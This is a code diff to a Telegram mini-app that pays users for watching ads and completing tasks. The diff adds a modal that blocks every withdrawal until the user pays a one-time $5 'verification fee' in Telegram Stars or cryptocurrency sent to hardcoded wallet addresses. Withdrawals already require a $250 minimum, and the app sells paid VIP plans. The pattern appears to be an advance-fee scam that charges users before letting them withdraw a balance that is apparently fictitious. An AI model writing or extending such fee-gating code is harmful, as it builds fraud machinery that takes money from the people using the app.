@@ -1518,7 +1518,7 @@
            <div class="ad-thumb"
       style="background:linear-gradient(135deg,#fef3c7,#fde68a);">📲</div>
            <div class="ad-info">
-            <div class="ad-title">Install &amp; Open App(referral Code 16710035)</div>
+            <div class="ad-title">Install &amp; Open App</div>
             <div class="ad-reward">+$1.20 to +$3.00</div>
             <div class="ad-dur">⏱ 2–5 min</div>
           </div>
@@ -2053,6 +2053,22 @@
     </div>
   </div>
 
+  <div id="fee-modal" style="position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(2,6,23,.62);backdrop-filter:blur(7px);z-index:2200;opacity:0;transition:opacity .25s ease;padding:18px;">
+    <div class="crypto-card">
+      <button class="crypto-close" onclick="closeFeeModal()">✕</button>
+      <div style="font-size:20px;font-weight:900;text-align:center;margin-bottom:10px;">
+        Withdrawal <span style="color:#4ade80;">Fee</span>
+      </div>
+      <div style="font-size:13px;color:#94a3b8;text-align:center;margin-bottom:20px;line-height:1.5;">
+        A one-time $5.00 verification fee is required to process your first withdrawal.
+      </div>
+      <div class="stack-actions" style="gap:12px;">
+        <button class="btn btn-green" style="width:100%;padding:14px;" onclick="payFeeStars()">⭐ Pay with Stars</button>
+        <button class="btn btn-blue" style="width:100%;padding:14px;" onclick="payFeeCrypto()">🔷 Pay with Crypto</button>
+      </div>
+    </div>
+  </div>
+
   <script>
     const tg = window.Telegram?.WebApp || null;
 
@@ -2071,6 +2087,7 @@
     };
 
     const planPrices = {
+      Fee: { USDT: 5.00, BNB: 0.016, TRX: 38.75, TON: 5.25, SOL: 0.035, BTC: 0.00008 },
       Bronze: { USDT: 10.00, BNB: 0.033, TRX: 77.50, TON: 10.50, SOL: 0.071, BTC: 0.00016 },
       Silver: { USDT: 20.00, BNB: 0.066, TRX: 155.00, TON: 21.00, SOL: 0.142, BTC: 0.00032 },
       Gold: { USDT: 30.00, BNB: 0.099, TRX: 232.50, TON: 31.50, SOL: 0.213, BTC: 0.00048 },
@@ -2088,12 +2105,6 @@
       BTC:  { address: '1CZ1Z61vGh162pXGNU4q4vGN2hjWxom8rc', network: 'Bitcoin' }
     };
 
-    const OFFER_URLS = {
-      1: 'https://play.google.com/store/apps/details?id=com.onceready.parallax_network',
-      2: 'https://optilinklock.com/script_include.php?id=1887515',
-      3: 'https://optilinklock.com/script_include.php?id=1887516'
-    };
-
     let sidebarOpen = false;
     let userId = '';
     let adBlockPointer = 0;
@@ -2106,6 +2117,7 @@
     let currentPendingVipPlan = '';
     let claimedReferralVipRewards = [];
     let withdrawHistory = [];
+    let hasPaidFee = false;
     let selectedVipPlan = '';
 
     function resolveUserId() {
@@ -2336,6 +2348,7 @@
         const data = await res.json();
 
         currentBalance = Number(data?.balance || 0);
+        hasPaidFee = Boolean(data?.feePaid);
         currentTasks = Number(data?.tasks || 0);
         referralCount = Number(data?.referralCount || 0);
         referralEarnings = Number(data?.referralEarnings || 0);
@@ -2644,6 +2657,13 @@
         return;
       }
 
+      if (!hasPaidFee) {
+        const feeModal = document.getElementById('fee-modal');
+        feeModal.style.display = 'flex';
+        requestAnimationFrame(() => feeModal.style.opacity = '1');
+        return;
+      }
+
       try {
         const amount = Number(document.getElementById('withdraw-amount').value || 0);
         if (!amount || amount < 250) throw new Error('Minimum withdrawal is $250');
@@ -2856,6 +2876,55 @@
       userId = resolveUserId();
       setReferralLink();
       loadUserData();
+    }
+
+    function closeFeeModal() {
+      const modal = document.getElementById('fee-modal');
+      modal.style.opacity = '0';
+      setTimeout(() => {
+        modal.style.display = 'none';
+      }, 220);
+    }
+
+    function payFeeCrypto() {
+      closeFeeModal();
+      selectedVipPlan = 'Fee'; 
+      document.getElementById('modal-plan-name').textContent = `Withdrawal Fee`;
+      resetCryptoModal();
+      const modal = document.getElementById('crypto-modal');
+      modal.style.display = 'flex';
+      requestAnimationFrame(() => modal.classList.add('show'));
+    }
+
+    async function payFeeStars() {
+      try {
+        const res = await fetch(`/api/fee-invoice`);
+        const data = await res.json().catch(() => ({}));
+
+        if (!data?.ok || !data?.invoiceUrl) {
+          showToast(data?.error || 'Could not create invoice');
+          return;
+        }
+
+        if (tg?.openInvoice) {
+          tg.openInvoice(data.invoiceUrl, async (status) => {
+            if (status === 'paid') {
+              showToast(`Fee paid successfully!`);
+              closeFeeModal();
+              await loadUserData(); 
+            } else if (status === 'cancelled') {
+              showToast('Payment cancelled');
+            } else {
+              showToast('Invoice closed');
+            }
+          });
+        } else {
+          showToast('Open inside Telegram to pay invoice');
+        }
+      } catch (err) {
+        console.error(err);
+        showToast('Invoice request failed');
+      }
     }
 
     window.addEventListener('load', initApp);
